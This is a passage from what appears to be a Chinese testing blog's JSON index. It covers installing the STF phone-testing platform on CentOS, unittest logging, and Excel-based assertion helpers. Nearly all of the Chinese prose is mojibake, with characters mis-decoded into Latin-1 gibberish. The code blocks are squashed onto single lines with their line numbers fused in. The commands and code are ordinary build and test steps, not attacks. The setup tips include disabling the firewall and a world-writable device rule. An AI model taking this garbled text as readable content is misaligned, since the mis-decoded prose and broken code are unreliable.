æˆ‘é“¾æ¥äº†ä¸¤ä¸ªæ‰‹æœºï¼Œå¯ä»¥çœ‹åˆ°ç»“æœä¸­æœ‰ä¸¤æ¡è®¾å¤‡ï¼Œè®¾å¤‡å·åé¢çš„çŠ¶æ€æ˜¯deviceè¯æ˜è®¾å¤‡æ­£å¸¸å¯æ“ä½œï¼Œå¦‚æœä¸æ˜¯æ­¤çŠ¶æ€ï¼Œè€Œæ˜¯unauthorized,offlineç­‰ï¼Œæ£€æŸ¥ä¸€ä¸‹æ‰‹æœºæ˜¯å¦è¿æ¥å¥½ç”µè„‘ï¼Œå¹¶ä¸”å¼€å¯äº†USBè°ƒè¯•ã€‚ 4.nodeå®‰è£…ä¾æ¬¡æ‰§è¡Œï¼š 1234567cd /usr/localmkdir node cd nodewget https://nodejs.org/download/release/v9.0.0/node-v9.0.0-linux-x64.tar.gztar xvf node-v9.0.0-linux-x64.tar.gzln -s /usr/local/node/node-v9.0.0-linux-x64/bin/node /usr/local/bin/nodeln -s /usr/local/node/node-v9.0.0-linux-x64/bin/npm /usr/local/bin/npm æ£€æŸ¥ç¯å¢ƒ 12node -vnpm -v å»ºè®®å®‰è£…cnpm,åé¢ç›´æ¥ç”¨npmå®‰è£…STFé€Ÿåº¦å¾ˆæ…¢ç”šè‡³å¤±è´¥ï¼Œä½¿ç”¨å›½å†…çš„é•œåƒé€Ÿåº¦è¦å¿«å¾ˆå¤š 1npm install -g cnpm --registry=https://registry.npm.taobao.org æ£€æŸ¥cnpmæ˜¯å¦å®‰è£…OK 1cnpm -v è‹¥æç¤ºcnpmå‘½ä»¤ä¸å­˜åœ¨ï¼Œæ˜¯å› ä¸ºæ²¡æœ‰ç»™cnpmæ‰§è¡Œç¨‹åºé…ç½®ç¯å¢ƒå˜é‡ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤åˆ›å»ºè½¯é“¾æ¥å³å¯ï¼Œåœ¨ç³»ç»Ÿä»»ä½•åœ°æ–¹å°±éƒ½èƒ½ä½¿ç”¨cnpm 1ln -s /usr/local/node/node-v9.0.0-linux-x64/bin/cnpm /usr/local/bin/ 5.rethinkdbå®‰è£…ä¾æ¬¡æ‰§è¡Œ: 123cd /opt/dong -----å³åœ¨optæ–°å»ºä¸€ä¸ªç›®å½•ç”¨æ¥ç”¨æ¥å…¶ä»–ä¾èµ–wget http://download.rethinkdb.com/centos/7/`uname -m`/rethinkdb.repo -O /etc/yum.repos.d/rethinkdb.repoyum install rethinkdb æ£€æŸ¥ç¯å¢ƒæ˜¯å¦ok: 1rethinkdb -v å¯åŠ¨rethinkdbç›´æ¥åœ¨å‘½ä»¤è¡Œè¾“å…¥rethinkdbå¹¶å›è½¦å³å¯å¼€å¯ 1rethinkdb ä¹Ÿå¯ä»¥å°†å®ƒæ”¾å…¥åå°æ‰§è¡Œ 1rethinkdb &amp; 6.GraphicsMagickå®‰è£…ä¾æ¬¡æ‰§è¡Œï¼š 1234567cd /opt/dongwget https://iweb.dl.sourceforge.net/project/graphicsmagick/graphicsmagick/1.3.26/GraphicsMagick-1.3.26.tar.gztar xvf GraphicsMagick-1.3.26.tar.gzcd GraphicsMagick-1.3.26./configuremakemake install éªŒè¯ç¯å¢ƒæ˜¯å¦ok: 1gm 7.yasmå®‰è£…ä¾æ¬¡æ‰§è¡Œï¼š 1234567cd /opt/dongwget http://www.tortall.net/projects/yasm/releases/yasm-1.3.0.tar.gztar xvf yasm-1.3.0.tar.gzcd yasm-1.3.0./configuremakemake install éªŒè¯ç¯å¢ƒæ˜¯å¦ok: 1yasm --version 8.libsodiumå®‰è£…ä¾æ¬¡æ‰§è¡Œï¼š 123456cd /opt/dongwget https://download.libsodium.org/libsodium/releases/libsodium-1.0.15.tar.gztar xvf libsodium-1.0.15.tar.gz./configuremakemake install éªŒè¯ç¯å¢ƒæ˜¯å¦ok: 1whereis libsodium 9.zeromqå®‰è£…ä¾æ¬¡æ‰§è¡Œï¼š 12345678cd /opt/dongwget https://github.com/zeromq/libzmq/releases/download/v4.2.2/zeromq-4.2.2.tar.gztar xvf zeromq-4.2.2.tar.gzcd zeromq-4.2.2./configureé‡åˆ°æŠ¥é”™ï¼Œyum install gcc-c++makemake install æ‰“å¼€æ–‡ä»¶ï¼š 1vi /etc/ld.so.conf åœ¨è¯¥æ–‡ä»¶æœ€åæ·»åŠ ä¸€è¡Œï¼š 1/usr/local/lib æ‰§è¡Œï¼š 1ldconfig 10.protobufå®‰è£…ä¾æ¬¡æ‰§è¡Œï¼š 1234567cd /opt/dongwget https://github.com/google/protobuf/releases/download/v3.5.0/protobuf-cpp-3.5.0.tar.gztar xvf protobuf-cpp-3.5.0.tar.gzcd protobuf-3.5.0./configure --prefix=/usr/local/protobufmakemake install é…ç½®å˜é‡ï¼š 1vi /etc/profile åœ¨æ–‡ä»¶æœ«å°¾å¢åŠ å¦‚ä¸‹å†…å®¹ï¼š 12export PATH=$PATH:/usr/local/protobuf/bin/export PKG_CONFIG_PATH=/usr/local/protobuf/lib/pkgconfig/ æ‰§è¡Œï¼š 1source profile éªŒè¯ç¯å¢ƒæ˜¯å¦ok: 1protoc --version 11.pkg-configå®‰è£…ä¾æ¬¡æ‰§è¡Œï¼š 1234567cd /opt/dongwget http://pkgconfig.freedesktop.org/releases/pkg-config-0.29.2.tar.gztar xvf pkg-config-0.29.2.tar.gzcd pkg-config-0.29.2./configure --prefix=/usr/local/pkg-config --with-internal-glibmakemake install éªŒè¯ç¯å¢ƒæ˜¯å¦ok: 1pkg-config --version 12.stfå®‰è£…æ‰§è¡Œï¼š 12cnpm install -g stf# è¿™é‡Œå°±ç”¨åˆ°äº†å‰é¢å®‰è£…çš„cnpmï¼Œæ¯”npmé€Ÿåº¦å¿«å¾ˆå¤š ä¸‹è½½å®Œæˆåï¼Œæ£€æŸ¥STFæ‰€éœ€ç¯å¢ƒæ˜¯å¦éƒ½æ­£å¸¸ï¼š 12cd /usr/local/node/node-v9.0.0-linux-x64/lib/node_modules/stf/bin./stf doctor STFéœ€è¦çš„æ‰€æœ‰ç¯å¢ƒå°±å·²ç»å…¨éƒ¨æ­å»ºå®Œæˆï¼Œè™šæ‹Ÿæœºçš„è¯å»ºè®®åˆ›å»ºä¸ªå¿«ç…§ï¼Œé¿å…ä»¥åç¯å¢ƒå‡ºé—®é¢˜åå¯ä»¥å¿«é€Ÿæ¢å¤ å¼€å¯STFæœåŠ¡è¿›å…¥ç›®å½•ï¼š 1cd /usr/local/node/node-v9.0.0-linux-x64/lib/node_modules/stf/bin æ‰§è¡Œå‘½ä»¤ï¼š 1./stf local --public-ip 192.168.1.152 --port 7100 --allow-remote &amp; --public-ip 192.168.1.152å°±æ˜¯è¿™ä¸ªcentosæœºå™¨çš„IPï¼Œå¯ä»¥é€šè¿‡ifconfigå‘½ä»¤è·å–ã€‚--port 7100ç«¯å£é»˜è®¤æ˜¯7100ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸ºå…¶ä»–ç«¯å£ã€‚--allow-remoteè¡¨ç¤ºå¯ä»¥è¿œç¨‹è®¿é—®ã€‚&amp; åœ¨åå°æ‰§è¡ŒæœåŠ¡ã€‚ æ‰“å¼€webé¡µé¢æ‰“å¼€centosè‡ªå¸¦çš„ç«ç‹æµè§ˆå™¨ï¼Œè®¿é—®127.0.0.1:7100æˆ–è€…192.168.1.152:7100å³å¯è¿›å…¥ã€‚å› ä¸ºå‚æ•°ä¸­è®¾ç½®äº†å…è®¸è¿œç¨‹è®¿é—®ï¼Œåœ¨æœ¬æœºæˆ–è€…å±€åŸŸç½‘å†…çš„å…¶ä»–æœºå™¨çš„æµè§ˆå™¨è®¿é—®192.168.1.152:7100ä¹Ÿå¯ä»¥æ­£å¸¸è®¿é—®ï¼Œæ“ä½œæ‰‹æœºçš„ååº”é€Ÿåº¦å¾ˆå¿«ï¼Œå‡ ä¹æ²¡æœ‰å»¶è¿Ÿã€‚ ä¸‰ã€é”™è¯¯å¤„ç†1.adb devicesæ£€æµ‹ä¸åˆ°æ‰‹æœºé€šè¿‡lsusbèƒ½å¤Ÿæ£€æµ‹åˆ°USBè®¾å¤‡ï¼Œä½†æ˜¯adb deviceså´æ£€æŸ¥ä¸åˆ°ï¼Œæˆ–è€…æ£€æµ‹åˆ°æ‰‹æœºå´æç¤ºno permissionsï¼Œå¦‚ä¸‹ è§£å†³åŠæ³•ï¼šæ–°å»ºæ–‡ä»¶ 1vim /etc/udev/rules.d/51-android.rules åœ¨æ–‡ä»¶ä¸­å¡«å†™å¦‚ä¸‹ä¿¡æ¯å¹¶ä¿å­˜ï¼š 1SUBSYSTEM==\"usb\", ATTRS&#123;idVendor&#125;==\"2717\",ATTRS&#123;idProduct&#125;==\"ff48\",MODE=\"0666\" å…¶ä¸­2717å°±æ˜¯lsusbå‘½ä»¤æŸ¥å‡ºæ¥çš„æ­¤è®¾å¤‡çš„VIDï¼Œff48å°±æ˜¯lsusbå‘½ä»¤æŸ¥å‡ºæ¥çš„æ­¤è®¾å¤‡çš„PIDï¼Œ0666é»˜è®¤ä¸ç”¨ä¿®æ”¹ï¼Œå¤šä¸ªè®¾å¤‡çš„è¯MODEéƒ½å¡«å†™0666 2.STFç¯å¢ƒæ ¡éªŒæœ‰è¯¯Unexpected error checking ZeroMQï¼šErrorï¼šlibzmq.so.5: cannot open shared object file: No such file or directorylibzmq.so.5è¿™ä¸ªæ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„æ˜¯/usr/local/lib è§£å†³åŠæ³•ï¼š(ä¸Šé¢å®‰è£…è¿‡ç¨‹çš„ç¬¬ä¹æ­¥)æ‰“å¼€æ–‡ä»¶ï¼š 1vi /etc/ld.so.conf åœ¨è¯¥æ–‡ä»¶æœ€åæ·»åŠ ä¸€è¡Œå¹¶ä¿å­˜ï¼š 1/usr/local/lib æ‰§è¡Œï¼š 1ldconfig 3.STFæœåŠ¡å¯åŠ¨å¤±è´¥ä¸‹å›¾ä¸­çš„å¯åŠ¨æŠ¥é”™æ˜¯å› ä¸ºrethinkdbæ²¡æœ‰å¯åŠ¨å¯¼è‡´çš„ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢å®‰è£…æ­¥éª¤çš„ç¬¬äº”æ­¥ï¼Œå®‰è£…å®Œåè¦åœ¨å‘½ä»¤è¡Œè¾“å…¥rethinkdbå°†å®ƒå¯åŠ¨ 4.è¿œç¨‹æœºå™¨æ— æ³•è®¿é—®é¡µé¢æ˜¯å› ä¸ºcentosé˜²ç«å¢™å¯¼è‡´çš„ï¼Œå…³é—­é˜²ç«å¢™å³å¯ï¼Œæ³¨æ„centos7é»˜è®¤å…³é—­é˜²ç«å¢™çš„å‘½ä»¤è·Ÿcentos6.Xæœ‰åŒºåˆ« å‚è€ƒæ–‡ç« https://www.jianshu.com/p/539ee1053da3https://testerhome.com/topics/16355","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"APP","slug":"APP","permalink":"http://yoursite.com/tags/APP/"},{"name":"STF","slug":"STF","permalink":"http://yoursite.com/tags/STF/"}]},{"title":"unittestæµ‹è¯•ä¸­æ·»åŠ log","slug":"unittestæµ‹è¯•ä¸­æ·»åŠ log","date":"2018-08-17T12:30:00.000Z","updated":"2018-12-17T02:30:56.787Z","comments":true,"path":"2018/08/17/unittestæµ‹è¯•ä¸­æ·»åŠ log/","link":"","permalink":"http://yoursite.com/2018/08/17/unittest%E6%B5%8B%E8%AF%95%E4%B8%AD%E6%B7%BB%E5%8A%A0log/","excerpt":"","text":"å‰è¨€åœ¨ä½¿ç”¨python + unittestæ‰§è¡Œæµ‹è¯•ç”¨ä¾‹æ—¶å°†å¿…è¦çš„æ—¥å¿—ä¿¡æ¯è¾“å‡ºåˆ°æœ¬åœ°æ–‡ä»¶å’Œæ§åˆ¶å°æ–¹ä¾¿å®šä½é—®é¢˜ã€‚ ä¸€ã€è¯¦è§£1.é¦–å…ˆæ–°å»ºä¸€ä¸ªå…¬å…±æ–‡ä»¶publicData.pyï¼Œå¯¼å…¥loggingæ¨¡å—ï¼Œåˆ›å»ºä¸€ä¸ªå®åˆ— 1234import logginglogger = logging.getLogger()logger.setLevel(level=logging.DEBUG) #è®¾ç½®æ—¥å¿—ç­‰çº§ï¼ŒINFO/DEBUG/WARNING/ERROR 2.åˆ›å»ºhandlerï¼Œæ—¥å¿—å†™å…¥æœ¬åœ° 1234handler = logging.FileHandler('E:/test.log') #è®¾ç½®æ—¥å¿—è¾“å‡ºè·¯å¾„handler.setLevel(logging.DEBUG) #è®¾ç½®æ‰“å°çš„æ—¥å¿—ç­‰çº§formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s') #è®¾ç½®æ‰“å°æ ¼å¼handler.setFormatter(formatter) %(asctime)s ä»£è¡¨æ—¶é—´%(levelname)s ä»£è¡¨æ—¥å¿—ç­‰çº§ï¼ˆINFO,DEBUG,ERRORç­‰ï¼‰%(message)s ä»£è¡¨è¾“å‡ºçš„æ—¥å¿—å†…å®¹ 3.åˆ›å»ºconsoleï¼Œæ‰§è¡Œä»»åŠ¡æ—¶æ—¥å¿—è¾“å‡ºåˆ°æ§åˆ¶å° 12console = logging.StreamHandler()console.setLevel(logging.DEBUG) #è®¾ç½®æ§åˆ¶å°è¾“å‡ºçš„æ—¥å¿—ç­‰çº§ 4.å°†åˆ›å»ºçš„handler/consoleæ·»åŠ åˆ°å®ä¾‹logger 12logger.addHandler(handler)logger.addHandler(console) äºŒã€æ•´åˆæ‰“å°æ—¥å¿—ä¸€èˆ¬æŒ‰ç…§æ—¥æœŸæ¥å‘½åï¼Œå¯¼å…¥time.strftime()æ–¹æ³•æ‰“å°å½“å‰æ—¶é—´å¹¶å‘½åç»™æ—¥å¿—,å®Œæ•´ä»£ç å¦‚ä¸‹ 12345678910111213141516171819def setlogging(): '''æ‰“å°æ—¥å¿—å…¬å…±æ–¹æ³•''' t = time.strftime('%Y-%m-%d') logger = logging.getLogger() logger.setLevel(level=logging.DEBUG) handler = logging.FileHandler('C:/foxrenderfarmApi/logs/' + t + \".log\") handler.setLevel(logging.DEBUG) formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s') handler.setFormatter(formatter) console = logging.StreamHandler() console.setLevel(logging.DEBUG) logger.addHandler(handler) logger.addHandler(console) return logger ä¸‰ã€è°ƒç”¨åœ¨æ¯ä¸ªç”¨ä¾‹æ¨¡å—çš„ç±»ä¸‹é¢å…ˆå¯¼å…¥ä¸Šé¢å†™å¥½çš„æ‰“å°æ—¥å¿—å…¬å…±æ–¹æ³•. 1234567from public.public_data import *class anaLysis(unittest.TestCase): '''åˆ†ææ¨¡å—æ¥å£æµ‹è¯•''' logger = setlogging() logger.info('å¼€å§‹æ‰§è¡Œåˆ†ææ¨¡å—æ¥å£ç”¨ä¾‹') ç„¶ååœ¨éœ€è¦æ‰“å°æ—¥å¿—çš„åœ°æ–¹ä½¿ç”¨logger.ingo(â€˜è¿™é‡Œæ˜¯æ—¥å¿—â€™)æ‰“å°æ—¥å¿—å³å¯ï¼Œç”±äºæˆ‘ç°åœ¨æ¥å£è‡ªåŠ¨åŒ–æµ‹è¯•ç”¨çš„unittestæ¡†æ¶ï¼Œæ¯ä¸ªæ¥å£ç”¨ä¾‹éœ€è¦æ‰“å°çš„æ—¥å¿—ä¿¡æ¯åŸºæœ¬ç›¸åŒï¼Œå› æ­¤ç›´æ¥åœ¨tearDown()æ–¹æ³•ä¸‹é¢æ·»åŠ éœ€è¦çš„æ—¥å¿—ä¿¡æ¯ï¼Œä¾‹å¦‚æˆ‘è¿™é‡Œåˆ†åˆ«æ‰“å°æ¥å£åã€è¯·æ±‚å‚æ•°ã€è¿”å›ç»“æœã€‚ 1234def tearDown(self): logger.info(self.apiname) logger.info(self.data) logger.info(self.result) æ³¨æ„ä»¥ä¸Šæ–¹æ³•åŸºæœ¬ä¸Šå·²ç»å®ç°äº†æœ¬æ–‡è®²è¿°çš„åœ¨unittestä¸­æ·»åŠ logçš„ç›®çš„ï¼Œåœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­å‘ç°ï¼Œå•ä¸ªæµ‹è¯•ç”¨ä¾‹æ–‡ä»¶æ‰§è¡Œæ—¶æ—¥å¿—æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯è¿è¡Œrun.pyæ–‡ä»¶æ‰§è¡Œæ‰€æœ‰æ¨¡å—æµ‹è¯•ç”¨ä¾‹çš„æ—¶å€™æ—¥å¿—å›æ‰“å°å¤šéï¼Œè¿™æ˜¯å› ä¸ºunitestçš„æ‰§è¡Œç­–ç•¥å¯¼è‡´ï¼Œåœ¨æ¯ä¸ªæ¨¡å—çš„æœ€å¼€å§‹éƒ½å®ä¾‹åŒ–äº†ä¸€ä¸ªloggerï¼Œå¦‚ä¸‹å›¾ã€‚ è§£å†³åŠæ³•åœ¨å…¬å…±æ–‡ä»¶å†™å¥½çš„setlogging()æ–¹æ³•ä¸‹ç›´æ¥è°ƒç”¨æ­¤æ–¹æ³•ï¼Œæ¯ä¸ªæµ‹è¯•ç”¨ä¾‹æ–‡ä»¶ä¸å†é‡å¤è°ƒç”¨ï¼Œå¯¼å…¥åç›´æ¥ä½¿ç”¨ã€‚ peili","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"æ¥å£æµ‹è¯•","slug":"æ¥å£æµ‹è¯•","permalink":"http://yoursite.com/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/"},{"name":"log","slug":"log","permalink":"http://yoursite.com/tags/log/"},{"name":"unittest","slug":"unittest","permalink":"http://yoursite.com/tags/unittest/"}]},{"title":"HTTPæ¥å£æµ‹è¯•è‡ªåŠ¨æ ¡éªŒå¤šä¸ªå­—æ®µï¼Œå¢å¼ºexcelç”¨ä¾‹å¯ç»´æŠ¤æ€§çš„æ–¹æ³•","slug":"æ¥å£æµ‹è¯•è‡ªåŠ¨æ ¡éªŒå¤šä¸ªå­—æ®µï¼Œå¢å¼ºexcelç”¨ä¾‹å¯ç»´æŠ¤æ€§çš„æ–¹æ³•","date":"2018-08-10T12:30:00.000Z","updated":"2018-12-17T02:30:56.656Z","comments":true,"path":"2018/08/10/æ¥å£æµ‹è¯•è‡ªåŠ¨æ ¡éªŒå¤šä¸ªå­—æ®µï¼Œå¢å¼ºexcelç”¨ä¾‹å¯ç»´æŠ¤æ€§çš„æ–¹æ³•/","link":"","permalink":"http://yoursite.com/2018/08/10/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E8%87%AA%E5%8A%A8%E6%A0%A1%E9%AA%8C%E5%A4%9A%E4%B8%AA%E5%AD%97%E6%AE%B5%EF%BC%8C%E5%A2%9E%E5%BC%BAexcel%E7%94%A8%E4%BE%8B%E5%8F%AF%E7%BB%B4%E6%8A%A4%E6%80%A7%E7%9A%84%E6%96%B9%E6%B3%95/","excerpt":"","text":"å‰è¨€å½“æ¥å£æ¯”è¾ƒå¤šï¼Œè¿”å›å€¼ä¹Ÿæ¯”è¾ƒå¤šï¼Œæ¥å£è‡ªåŠ¨åŒ–æµ‹è¯•æ ¡éªŒè¿”å›å€¼æ˜¯å¦ç¬¦åˆé¢„æœŸå°±å¾—åœ¨æ¯æ¡æµ‹è¯•ç”¨ä¾‹åé¢æ·»åŠ å¤šä¸ªassertæ ¡éªŒï¼Œå‡ ç™¾æ¡ç”¨ä¾‹çš„æ—¶å€™å†™æ ¡éªŒè¯­å¥å°±å¾—ä¸Šåƒæ¡ï¼Œä¸ºäº†ç®€åŒ–ä»£ç ï¼ŒåŒæ—¶ä¸ºäº†æ–¹ä¾¿ç»§ç»­ä½¿ç”¨ç°æœ‰çš„excelè¡¨ç»´æŠ¤æ¥å£ç”¨ä¾‹ï¼Œå› æ­¤å°†æ–­è¨€çš„æ–¹æ³•é‡æ–°å°è£…ä¸ºä¸€ä¸ªæ˜“ç”¨çš„å‡½æ•°æ¥è°ƒç”¨ã€‚ å®ç°æ–¹å¼æ•´ç†excelç”¨ä¾‹é¦–å…ˆexcelä¸­çš„ç”¨ä¾‹é¢„æœŸç»“æœæŒ‰ç…§ç»Ÿä¸€çš„æ ¼å¼æ¥å†™ï¼Œè¿™æ˜¯æ–¹ä¾¿ä»£ç è·å–åˆ°é¢„æœŸç»“æœå¹¶åšä¸‹ä¸€æ­¥æ“ä½œã€‚ä¾‹å¦‚è¿™ä¸€ä¸ªæ¥å£æˆ‘è¦æ£€éªŒè¿”å›å€¼ä¸­çš„ä¸‰ä¸ªå­—æ®µï¼Œåˆ†åˆ«æ˜¯codeï¼Œmessageï¼Œresultï¼Œé¢„æœŸç»“æœè¿™ä¸€æ æ¯ä¸ªå­—æ®µåé¢å†™ä¸Šè‹±æ–‡å†’å·ä»¥åŠé¢„æœŸå€¼ï¼Œä¸‰ä¸ªå­—æ®µé€šè¿‡æ¢è¡Œåˆ†éš”å¼€ã€‚ ç¼–å†™å…¬å…±æ–¹æ³•è¿™é‡Œæˆ‘æ–°å»ºä¸€ä¸ªpublic_data.pyæ–‡ä»¶ï¼Œåœ¨é‡Œé¢ç¼–å†™å…¬å…±æ–¹æ³•ã€‚ 1.è¯»å–excelè¡¨å…¬å…±æ–¹æ³•è¿™æ®µä»£ç æ˜¯ä»excelè¯»å–å†…å®¹çš„å…¬å…±æ–¹æ³•ï¼Œå®ƒæ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯è¡¨çš„åç§°ã€è¡Œã€åˆ—ï¼Œå¯ä»¥å–åˆ°å…·ä½“å“ªä¸€ä¸ªæ¡†çš„å†…å®¹ã€‚ 123456def read_excel(sheet,row,col): '''è¯»å–excelè¡¨å…¬å…±æ–¹æ³•''' a = xlrd.open_workbook('E:/R-Test/datas/test_data.xls') b = a.sheet_by_name(sheet) c = b.cell_value(row,col) return c 2.åˆ¤æ–­æ¯ä¸ªæ¥å£ç”¨ä¾‹æ‰§è¡Œå‡ æ¬¡æ–­è¨€å…¬å…±æ–¹æ³•è¿™æ®µä»£ç æ˜¯æ ¡éªŒå¤šä¸ªè¿”å›å­—æ®µçš„å…¬å…±æ–¹æ³•ï¼Œå®ƒæ¥æ”¶äº”ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯selfã€è¡¨åã€è¡Œã€åˆ—ã€è¯·æ±‚è¿”å›å€¼ã€‚è°ƒç”¨ä¸Šé¢çš„è¯»å–excelè¡¨å…¬å…±æ–¹æ³•ï¼Œä»é¢„æœŸç»“æœæ è·å–éœ€è¦æ ¡éªŒçš„å­—æ®µåï¼Œé¢„æœŸå€¼ï¼Œæ­¤æ–¹æ³•ç›´æ¥è·å–åˆ°çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç°åœ¨é€šè¿‡æ¢è¡Œç¬¦å°†éœ€è¦æ ¡éªŒçš„å‡ ä¸ªå­—æ®µæ‹†åˆ†ï¼Œç„¶åæ”¾å…¥forå¾ªç¯ç”¨assertæ¥æ–­è¨€ã€‚ 1234567891011def assert_num(self,sheet,row,col,result): '''åˆ¤æ–­æ¯ä¸ªæ¥å£ç”¨ä¾‹æ‰§è¡Œå‡ æ¬¡æ–­è¨€''' a = read_excel(sheet,row,col).split('\\n') #è·å–é¢„æœŸç»“æœ b = read_excel(sheet, row, col+1).split('\\n') #è·å–ç»“æœè§£é‡Šï¼Œç”¨äºæ–­è¨€å¤±è´¥åæ‰“å°å¿…è¦ä¿¡æ¯ for i,j in zip(a,b): r = result[i.split(':')[0]] #rå°±æ˜¯ä»è¿”å›å€¼ä¸­å–å‡ºçš„è¦è¿›è¡Œæ ¡éªŒçš„å­—æ®µï¼Œresultå‚æ•°æ˜¯éœ€è¦ä¼ å…¥çš„æ¥å£è¿”å›ä¿¡æ¯ã€‚ if type(r) is int: #å¦‚æœè¿”å›å€¼å–å‡ºçš„æ•°æ®ä¸ºintæ ¼å¼ï¼ŒæŠŠä»–è½¬ä¸ºstrï¼Œæ–¹ä¾¿è·Ÿexcelä¸­å–å‡ºçš„å­—ç¬¦ä¸²æ¯”è¾ƒ,æ­¤æ¡†æ¶ä»excelè¡¨ä¸­å–å‡ºçš„å†…å®¹ä¸ºstræ ¼å¼ r = str(r) else: pass self.assertEqual(r, i.split(':')[1],msg='['+j+'æ ¡éªŒæœ‰è¯¯]') 3.ä¼˜åŒ–ä¸Šä¸€ä¸ªæ–¹æ³•å®é™…æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°æœ‰äº›è¦æ ¡éªŒçš„å­—æ®µå¹¶ä¸æ˜¯åœ¨æ¥å£è¿”å›jsonçš„ç¬¬ä¸€å±‚ï¼Œè€Œæ˜¯åµŒå¥—å¥½å‡ å±‚çš„ï¼Œä¾‹å¦‚ä¸‹é¢è¿™ä¸ªæ¥å£çš„statuså­—æ®µã€‚ å› æ­¤éœ€è¦æ ¡éªŒè¿™äº›å­—æ®µçš„è¯é¦–å…ˆè¦ä»excelè¡¨ä¸­æ‹¿åˆ°æ­£ç¡®çš„å­—æ®µåï¼ŒåŒæ ·åœ¨å†™excelè¡¨çš„æ—¶å€™å°±æŒ‰ç…§å›ºå®šæ ¼å¼ï¼Œé‚£ä¹ˆå­—æ®µåå†™æˆè¿™æ ·ï¼Œæ¯ä¸€å±‚ä¸­é—´ç”¨çŸ­æ¨ªçº¿â€™-â€˜åˆ†å¼€ï¼Œæ³¨æ„å¦‚æœæµ‹è¯•çš„æ¥å£æœ¬èº«å­—æ®µæœ‰çŸ­æ¨ªçº¿è¦æ³¨æ„åŒºåˆ†ï¼Œæ¢æˆå…¶ä»–çš„ç¬¦å·ã€‚ ç„¶åä¿®æ”¹ä¸Šé¢çš„ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920def assert_num(self,sheet,row,col,result): '''åˆ¤æ–­æ¯ä¸ªæ¥å£ç”¨ä¾‹æ‰§è¡Œå‡ æ¬¡æ–­è¨€''' a = read_excel(sheet,row,col).split('\\n') #è·å–é¢„æœŸç»“æœ b = read_excel(sheet, row, col+1).split('\\n') #è·å–ç»“æœè§£é‡Š for i,j in zip(a,b): x = i.split(':')[0] #xå°±æ˜¯ä»è¿”å›å€¼ä¸­å–å‡ºçš„è¦è¿›è¡Œæ ¡éªŒçš„å­—æ®µ if '-' in x: #åˆ¤æ–­è‹¥excelé‡Œé¢é¢å­—æ®µä¸æ˜¯ä¸€å±‚ï¼Œåˆ™è½¬æ¢æˆå­—å…¸è¿ç»­å–å€¼çš„æ ¼å¼ y = x.split('-') for key in y: #é€šè¿‡forå¾ªç¯ä¾æ¬¡è·å–ä¸‹ä¸€å±‚çš„å­—æ®µå€¼ result = result[key] r = result else: r = result[x] if type(r) is int: #å¦‚æœè¿”å›å€¼å–å‡ºçš„æ•°æ®ä¸ºintæ ¼å¼ï¼ŒæŠŠä»–è½¬ä¸ºstrï¼Œæ–¹ä¾¿è·Ÿexcelä¸­å–å‡ºçš„å­—ç¬¦ä¸²æ¯”è¾ƒ,æ­¤æ¡†æ¶ä»excelè¡¨ä¸­å–å‡ºçš„å†…å®¹ä¸ºstræ ¼å¼ r = str(r) if type(r) is bool: #æœ‰äº›æ¥å£è¿”å›å€¼æ˜¯å¸ƒå°”å€¼ï¼Œè½¬æ¢æˆå­—ç¬¦ä¸² r = str(r) else: pass self.assertIn(i.split(':')[1], r,msg='['+j+'æ ¡éªŒæœ‰è¯¯]') åœ¨æ¥å£æµ‹è¯•ç”¨ä¾‹ä¸­è°ƒç”¨åœ¨æµ‹è¯•ç”¨ä¾‹æ‰€åœ¨çš„æ–‡ä»¶ä¸­å¯¼å…¥å…¬å…±æ–¹æ³•ï¼Œç„¶ååœ¨æ¥å£æµ‹è¯•ç”¨ä¾‹æ‰§è¡Œå®Œæ¯•åè°ƒç”¨æ–­è¨€æ ¡éªŒçš„æ–¹æ³•å°±å¯ä»¥è‡ªåŠ¨åˆ¤æ–­æœ‰å‡ æ¡å­—æ®µéœ€è¦æ ¡éªŒï¼Œåˆ†åˆ«æ ¡éªŒå¹¶æ‰“å°ç»“æœã€‚ peili","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"unittest","slug":"unittest","permalink":"http://yoursite.com/tags/unittest/"},{"name":"excel","slug":"excel","permalink":"http://yoursite.com/tags/excel/"}]},{"title":"å‘½ä»¤è¡Œä¸‹mysqlä¸­æ–‡ä¹±ç è§£å†³åŠæ³•","slug":"å‘½ä»¤è¡Œä¸‹mysqlä¸­æ–‡ä¹±ç è§£å†³åŠæ³•","date":"2018-08-08T04:30:00.000Z","updated":"2018-12-17T02:30:56.842Z","comments":true,"path":"2018/08/08/å‘½ä»¤è¡Œä¸‹mysqlä¸­æ–‡ä¹±ç è§£å†³åŠæ³•/","link":"","permalink":"http://yoursite.com/2018/08/08/%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8Bmysql%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/","excerpt":"","text":"å‰è¨€cmdå‘½ä»¤è¡Œä¸‹æ‰§è¡Œsqlé‡åˆ°ä¸­æ–‡ä¹±ç çš„é—®é¢˜ï¼Œå¦‚ä¸‹å›¾æŸ¥è¯¢è¯­å¥ é—®é¢˜åŸå› 